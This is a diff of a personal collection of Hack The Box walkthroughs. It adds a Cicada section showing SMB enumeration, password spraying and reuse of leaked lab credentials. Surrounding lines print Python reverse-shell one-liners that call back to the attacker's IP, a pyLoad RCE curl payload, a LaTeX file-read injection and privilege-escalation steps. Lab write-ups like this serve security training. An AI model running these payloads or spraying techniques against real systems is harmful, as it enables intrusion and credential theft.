@@ -32,7 +32,7 @@ onitorsTwo
 1. Reco `sudo nmap -sVC 10.10.11.208`
    * sudo nano /etc/hosts
      * 10.10.11.208 searcher.htb
-2. Weaponisation App is running Searchor v2.4.0 which has vuln ![](https://hackmd.io/\_uploads/S1qlltUqh.png)
+2. Weaponisation App is running Searchor v2.4.0 which has vuln ![](https://hackmd.io/_uploads/S1qlltUqh.png)
 3. Exploitation
 
 * as a search value, insert RS inside it:
@@ -44,7 +44,7 @@ onitorsTwo
    * cat user.txt
 5.  Root flag
 
-    ![](https://hackmd.io/\_uploads/HkC\_MK8qn.png)
+    ![](https://hackmd.io/_uploads/HkC_MK8qn.png)
 
     * UN: cody
     * PW: jh1usoih2bkjaspwe92
@@ -53,13 +53,13 @@ onitorsTwo
   * ssh svc@10.10.11.208
     * PW: jh1usoih2bkjaspwe92
   * we can edit the python script file
-    * ![](https://hackmd.io/\_uploads/SyKJVFIqn.png)
+    * ![](https://hackmd.io/_uploads/SyKJVFIqn.png)
 * PE
   * [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
     * `import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
   * cd
     * `nano full-checkup.sh`
-      * ![](https://hackmd.io/\_uploads/HyyBHKLq3.png)
+      * ![](https://hackmd.io/_uploads/HyyBHKLq3.png)
 
 ```
 #!/usr/bin/python3
@@ -70,7 +70,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
   * LOCAL machine: `nc -nlvp <port>`
   * `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`
 
-![](https://hackmd.io/\_uploads/S13UdFU9h.png)
+![](https://hackmd.io/_uploads/S13UdFU9h.png)
 
 ## MonitorsTwo
 
@@ -89,11 +89,11 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
   * cd
   * ls -la
     * there is an "entrypoint.sh" file
-      * cat entrypoint.sh ![](https://hackmd.io/\_uploads/H1H3v98qh.png)
+      * cat entrypoint.sh ![](https://hackmd.io/_uploads/H1H3v98qh.png)
         * MySQL credentials
   * cd /var/www/html
     * cat cacti.sql
-      * login credentials ![](https://hackmd.io/\_uploads/ryqNccI92.png)
+      * login credentials ![](https://hackmd.io/_uploads/ryqNccI92.png)
         * admin, guest
           * but not much helpful
   * there is "linpeas.sh" file
@@ -109,12 +109,12 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 
 4. User flag
    * ssh marcus@10.10.11.211
-     * PW: funkymonkey ![](https://hackmd.io/\_uploads/rylmhqIc3.png)
+     * PW: funkymonkey ![](https://hackmd.io/_uploads/rylmhqIc3.png)
 5. Root flag
    * cat /var/mail/marcus
-     * ![](https://hackmd.io/\_uploads/SJ6faqIq2.png)
+     * ![](https://hackmd.io/_uploads/SJ6faqIq2.png)
    * Docker version
-     * ![](https://hackmd.io/\_uploads/BJbh2qU92.png)
+     * ![](https://hackmd.io/_uploads/BJbh2qU92.png)
      * [VULN](https://github.com/UncleJ4ck/CVE-2021-41091)
    * upload the CVE exploit to the marcus ssh
    * LOCAL machine:
@@ -123,7 +123,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
      * chmod +x ./exp.sh
      * python3 -m http.server 80
    * marcus:
-     * wget http://\<LOCAL\_IP>/exp.sh ![](https://hackmd.io/\_uploads/BJxElo8q3.png)
+     * wget http://\<LOCAL\_IP>/exp.sh ![](https://hackmd.io/_uploads/BJxElo8q3.png)
      * chmod +x exp.sh
      * ./exp.sh
        * yes
@@ -143,10 +143,10 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 
 2. Weaponisation
    * grpcui -plaintext 10.10.11.214:50051
-   * ![](https://hackmd.io/\_uploads/HyzIFj8c3.png)
+   * ![](https://hackmd.io/_uploads/HyzIFj8c3.png)
      * admin:admin
        * obtained token
-3. Exploitation - run it in burpsuite - save the request as "sqli.req" - sqlmap -r sqli.req --dump ![](https://hackmd.io/\_uploads/SJH3ti853.png) - admin:admin - sau:HereIsYourPassWord1431
+3. Exploitation - run it in burpsuite - save the request as "sqli.req" - sqlmap -r sqli.req --dump ![](https://hackmd.io/_uploads/SJH3ti853.png) - admin:admin - sau:HereIsYourPassWord1431
 4. User flag
    * ssh sau@10.10.11.214
      * PW: HereIsYourPassWord1431
@@ -158,10 +158,10 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
        * cd
          * netstat -nltp
        * BUT running port 8000, service pyLoad
-         * [VULN](https://github.com/bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad)
+         * [VULN](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
      * `ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214`
        * access URL: 127.0.0.1:8888
-         * ![](https://hackmd.io/\_uploads/Hkva3iI9n.png)
+         * ![](https://hackmd.io/_uploads/Hkva3iI9n.png)
      * pyload --version
        * pyLoad 0.5.0
          * [CVE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)
@@ -173,7 +173,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 > $'http://127.0.0.1:8000/flash/addcrypted2'
 > ```
 
-* [Exploit Code](https://github.com/bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad)
+* [Exploit Code](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
   * edit it for our purpose curl -i -s -k -X $'POST'\
     \--data-binary $'jk=pyimport%20os;os.system("Bash%20/dev/shm/rev.sh");f=function%20f2(){};\&package=xxx\&crypted=AAAA&\&passwords=aaaa'\
     $'http://127.0.0.1:8000/flash/addcrypted2'
@@ -181,10 +181,10 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
   * cd /dev
     * cd shm
       * nano rev.sh
-        * ![](https://hackmd.io/\_uploads/SkYEyhUc2.png)
+        * ![](https://hackmd.io/_uploads/SkYEyhUc2.png)
       * chmod +x rev.sh
       * ./rev.sh
-      * ![](https://hackmd.io/\_uploads/rylOE2Iq3.png)
+      * ![](https://hackmd.io/_uploads/rylOE2Iq3.png)
 * on LOCAL machine:
   * `nc -nlvp 4444`
   * boom, we are in
@@ -199,7 +199,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
    * website
      * Gobuster found nothing
      * there is a link to LaTex Equation Generator
-2. Weaponisation - HTPASSWD exploit - `$\lstinputlisting{/var/www/dev/.htpasswd}$` - ![](https://hackmd.io/\_uploads/rkeYInIq3.png)
+2. Weaponisation - HTPASSWD exploit - `$\lstinputlisting{/var/www/dev/.htpasswd}$` - ![](https://hackmd.io/_uploads/rkeYInIq3.png)
 3. Exploitation
    * we obtained login credentials with hashed PW
      * hash-identifier -> md5
@@ -212,7 +212,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
    * cat user.txt
 5. Root flag
    * while searching the dirs in user, there is gnuplot in /opt dir
-     * ![](https://hackmd.io/\_uploads/rkJWO2Ucn.png)
+     * ![](https://hackmd.io/_uploads/rkJWO2Ucn.png)
      * gnuplot uses plt files - we can use it for pspy86 exploitation
        * lets create http server, upload a file containing exploit inside the machine to obtain root privileges
    * LOCAL machine:
@@ -341,15 +341,15 @@ print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(
 
 ### Reco
 
-* nmap ![](https://hackmd.io/\_uploads/SygLzvjn2.png)
+* nmap ![](https://hackmd.io/_uploads/SygLzvjn2.png)
   * 22 SSH
   * 80 HTTP without a redirect
 * website
-  * ![](https://hackmd.io/\_uploads/H1-lXPihh.png)
+  * ![](https://hackmd.io/_uploads/H1-lXPihh.png)
     * this tells us to add the URl into redirects to be able to connect to the website
       * /etc/hosts -> `tickets.keeper.htb`
-        * ![](https://hackmd.io/\_uploads/SJCHNvsn2.png)
-  * website login accessed: ![](https://hackmd.io/\_uploads/S19u4vs3n.png)
+        * ![](https://hackmd.io/_uploads/SJCHNvsn2.png)
+  * website login accessed: ![](https://hackmd.io/_uploads/S19u4vs3n.png)
 
 ### Weaponisation
 
@@ -357,18 +357,18 @@ print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(
   * Best Practical Request Tracker (RT) 4.4.4
     * outdated, little bit of finding to obtain default login credentials:
       * `root:password`
-        * [Source](https://wiki.gentoo.org/wiki/Request\_Tracker) ![](https://hackmd.io/\_uploads/H1w8Hws3n.png)
+        * [Source](https://wiki.gentoo.org/wiki/Request_Tracker) ![](https://hackmd.io/_uploads/H1w8Hws3n.png)
 * after login
-  * there is one ticket with history ![](https://hackmd.io/\_uploads/HJY1UDj33.png)
+  * there is one ticket with history ![](https://hackmd.io/_uploads/HJY1UDj33.png)
     * The attachment has been removed...
     * But there's also mention of another user named `lnorgaard`
 
 ### Exploitation
 
 * When we use the `Admin panel to view all Users`, there's a password located within the user's comments
-  * access admin -> users ![](https://hackmd.io/\_uploads/SyrpDvon3.png)
-  * select the user ![](https://hackmd.io/\_uploads/B1ckOwjhh.png)
-  * obtain SSH login credentials ![](https://hackmd.io/\_uploads/rkRSYPjh3.png)
+  * access admin -> users ![](https://hackmd.io/_uploads/SyrpDvon3.png)
+  * select the user ![](https://hackmd.io/_uploads/B1ckOwjhh.png)
+  * obtain SSH login credentials ![](https://hackmd.io/_uploads/rkRSYPjh3.png)
 
 ### User flag
 
@@ -380,7 +380,7 @@ print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(
 
 ### Root flag
 
-* ls ![](https://hackmd.io/\_uploads/SyHncvj23.png)
+* ls ![](https://hackmd.io/_uploads/SyHncvj23.png)
   * KeePassDumpFull.dmp
     * there is a CVE foor KeePassDump from 2023
       * [Exploit to obtain PW from dmp](https://sysdig.com/blog/keepass-cve-2023-32784-detection/)
@@ -681,7 +681,7 @@ else:
 
 `nmap -sVC 10.10.11.252`
 
-<figure><img src=".gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### **/etc/hosts**
 
@@ -689,7 +689,7 @@ else:
 
 `10.10.11.252 bizness.htb`
 
-<figure><img src=".gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
@@ -710,7 +710,7 @@ else:
 
 
 
-![](<.gitbook/assets/image (9) (1) (1) (1).png>)\
+![](<.gitbook/assets/image (9) (1) (1) (1) (1).png>)\
 
 
 ### Weaponisation
@@ -736,7 +736,7 @@ else:
 
 
 
-<figure><img src=".gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -749,7 +749,7 @@ else:
 
 `cat /etc/passwd`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `cd /tmp`&#x20;
 
@@ -759,7 +759,7 @@ else:
 
 `cat AdminuserLoginData.xml`
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Obtained info:
 
@@ -775,7 +775,7 @@ requirePasswordChange="Y"
 
 {% embed url="https://hashes.com/en/tools/hash_identifier" %}
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 OK - it could be SHA1, but nothing valuable
 
@@ -793,7 +793,7 @@ OK - it could be SHA1, but nothing valuable
 
 **OK, some SHA is stored in c6650.dat file**
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `admin$"`**`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=`**
 
@@ -880,7 +880,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `python3 hashcsript.py`
 
-<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `su root`
 
@@ -888,7 +888,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `cat root.txt`
 
-<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Crafty
 
@@ -898,16 +898,16 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 * nmap -sVC \<IP>
 
-<figure><img src=".gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Website
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * sudo nano /etc/hosts
   * \<IP> crafty.htb
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * subpages
   * /coming-soon
@@ -919,7 +919,7 @@ Website
 
 *
 
-    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -930,7 +930,7 @@ Website
 * extended nmap for higher ports
 * `nmap -sVC 10.10.11.249 -p0-65535`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * minecraft 1.16.5 Crafty server, Microsoft...
 
@@ -951,7 +951,7 @@ Minecraft Launcher
   * JDK 8
     * `wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz`
 
-<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -962,13 +962,13 @@ Logj4
   * change line 26 -> String cmd="cmd.exe"
     * because we are to attack Windows machine, not Linux (bin/sh)
 
-<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * run exploit (poc.py)
   * we are getting error, so we should move the downloaded jdk1.8.0\_20 file to the folder (log4j-shell-poc)
   * \+ change name to **jdk1.8.0\_20**
 
-<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -1040,7 +1040,7 @@ Finding vulnerability for PE
 * Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
   * F12 -> Network -> document
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Hosts
 
@@ -1060,7 +1060,7 @@ sudo nano /etc/hosts
     * get '/admin' do "Hello World" end
   * same output for any subpage it doesnt know
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -1072,11 +1072,11 @@ sudo nano /etc/hosts
       python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
       ```
 
-<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### BurpSuite
 
-<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * POST the calculator % send it to repeater
 
@@ -1116,7 +1116,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 
 `hashcat -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d`
 
-<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User Flag
 
@@ -1149,7 +1149,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 * 587 SMTP
 * 993 SSL/IMAP
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### hosts
 
@@ -1165,7 +1165,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 
 #### website
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 * "Powered by hMailServer"
   * opensource mail server for Win, AGLPv3 licence
@@ -1386,9 +1386,9 @@ now we can access the URL: **localhost:8888**
 
 * and login with amay credentials
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * we accessed the SysMonitor under -p 8080
   * we can analyze the log files...
@@ -1399,16 +1399,371 @@ now we can access the URL: **localhost:8888**
 
 #### Burpsuite
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 * we can modify the log file path...
   * /root/root.txt; cat root.txt
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Root flag obtained :-)
   * PWNED
+
+
+
+## Alert
+
+### Reco
+
+
+
+### Weaponisation
+
+### Exploitation
+
+### User flag
+
+### Root flag
+
+
+
+
+
+## Cicada
+
+
+
+### Reco
+
+#### nmap
+
+```bash
+sudo nmap -sVCS 10.10.11.35 --max-rate=1000
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 14:01 CET
+Nmap scan report for cicada.htb (10.10.11.35)
+Host is up (0.039s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-25 20:01:17Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-11-25T20:01:58
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.86 seconds
+```
+
+* from nmap we obtained info:
+  * Windows machine
+  * SMB under -p445
+
+
+
+#### scan SMB shares
+
+```bash
+smbmap -H 10.10.11.35 -u 'anonymous'
+```
+
+* scan it as anonymous user => default user with None PW
+* we obtained HR share with readonly access without PW
+
+```bash
+smbclient //10.10.11.35/HR -U 'anonymous'
+
+
+smb: \> dir
+  .                                   D        0  Thu Mar 14 13:29:09 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
+
+		4168447 blocks of size 4096. 415785 blocks available
+smb: \> get "Notice from HR.txt" 
+getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (7,8 KiloBytes/sec) (average 7,8 KiloBytes/sec)
+smb: \> exit
+```
+
+* there is a file
+  * get it to a local machine
+
+```bash
+$cat Notice\ from\ HR.txt 
+
+Dear new hire!
+
+Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+```
+
+* OK, we obtained default PW for new users...
+  *   ```
+      Cicada$M6Corpb*@Lp#nZp!8
+      ```
+
+
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+#### Using the default PW
+
+* how to use it?
+* lets dig the users in SMB and test if they didnt change default PW
+
+```bash
+nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
+
+...
+
+SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+```
+
+* lets make a list of users....
+
+```bash
+$cat users
+
+john.smoulder
+sarah.dantelia
+michael.wrightson
+david.orelious
+Dev Support
+emily.oscars
+```
+
+* try the obtained default PW on these users...
+
+```bash
+$nxc smb 10.10.11.35 -u users -p 'Cicada$M6Corpb*@Lp#nZp!8'
+
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+```
+
+* Michael Wrightson is baddy, uses default creds...&#x20;
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+#### Lateral Movement
+
+* lets enumerate other users for more info thanks to login of Michael
+
+```bash
+$nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
+SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
+SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
+SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
+SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
+SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
+SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
+SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
+
+```
+
+* David Orelious is another tough guy...here is his PW
+  * ```
+    aRt$Lp#7t*VQ!3
+    ```
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+* we have two users, lets check what right they have...
+
+```bash
+smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
+
+[+] IP: 10.10.11.35:445	Name: cicada.htb                                        
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	DEV                                               	READ ONLY	
+	HR                                                	READ ONLY	
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share
+```
+
+* cool, he has rights to another shares...lets test DEV one
+
+```bash
+$smbclient //10.10.11.35/DEV -U 'david.orelious' -N 'aRt$Lp#7t*VQ!3'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Mar 14 13:31:39 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
+
+		4168447 blocks of size 4096. 415326 blocks available
+smb: \> get Backup_script.ps1 
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2,0 KiloBytes/sec) (average 2,0 KiloBytes/sec)
+smb: \> exit
+```
+
